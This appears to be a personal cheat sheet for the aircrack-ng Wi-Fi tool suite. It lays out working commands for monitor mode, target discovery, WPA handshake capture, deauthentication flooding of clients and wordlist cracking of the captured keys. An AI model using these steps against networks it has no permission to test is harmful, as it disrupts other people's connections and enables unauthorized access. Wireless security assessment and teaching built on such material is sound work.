

```sh
>> sudo apt install aircrack-ng
>> aircrack-ng --help
```

**`Aircrack-ng`** is a complete suite of tools to assess Wi-Fi network security. It focuses on:
- Capturing packets
- Cracking `WEP` and `WPA/WPA2-PSK` keys
- Performing deauthentication attacks
- Monitoring wireless traffic


---
# `aircrack-ng` command

The actual command `aircrack-ng` is used **specifically for cracking Wi-Fi passwords**, once you’ve captured the right data.

**Basic `aircrack-ng` Syntax**
```bs
aircrack-ng -w <wordlist> -b <BSSID> <capture_file>
```

**Example**
```
aircrack-ng -w rockyou.txt -b 00:11:22:33:44:55 capture.cap
```
- `-w rockyou.txt`: Path to a wordlist for brute-force.
- `-b 00:11:22:33:44:55`: BSSID of the target network.
- `capture.cap`: File that contains the 4-way WPA handshake or WEP packets.


## Step-by-Step Wi-Fi Attack Overview:

Put Interface in Monitor Mode
```
sudo airmon-ng start wlan0
```

Find the Target
```
sudo airodump-ng wlan0mon
```

Capture the Handshake
```
sudo airodump-ng --bssid <AP_MAC> -c <channel> -w capture wlan0mon
```

Deauthenticate a Client (to force handshake)
```
sudo aireplay-ng --deauth 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon
```

Crack the Handshake
```
aircrack-ng -w wordlist.txt -b <AP_MAC> capture.cap
```

## 🧠 Tips:
- The handshake is only captured when a client connects or reconnects.
- Cracking WPA/WPA2 depends heavily on the **quality of your wordlist**.    
- WEP is outdated and easier to crack (but rarely used today).
- You can use `aircrack-ng *.cap` to try cracking multiple captures.


---

# Find target

This will show you a list of access points
```
sudo airodump-ng wlo1mon
```

look onto that AP
```sh
sudo airodump-ng --bssid <AP_MAC> -c <channel> wlo1mon
```

---
# Deauthentication

To send deauthentication (deauth) packets to a specific target using `aireplay-ng`, a part of the `Aircrack-ng` suite.


You **must** have your wireless card in **monitor mode**.
```
sudo airmon-ng start wlo1
```

Send deauth packets
```sh
sudo aireplay-ng --deauth <count> -a <AP_MAC> -c <Client_MAC> <interface>
```
- `--deauth <count>`: Number of deauth packets to send (use `0` for infinite).
- `-a <AP_MAC>`: The MAC address of the **Access Point** (router).
- `-c <Client_MAC>`: The MAC address of the **client** (device connected to the AP).
- `<interface>`: The **wireless interface** in monitor mode (e.g., `wlan0mon`).

Stop monitor mode
```sh
sudo airmon-ng stop wlo1mon
```

You may need to kill network managers to avoid conflicts
```sh
sudo airmon-ng check kill
```

Also you may need to start the `NetworkManager`
```bash
sudo systemctl start NetworkManager
```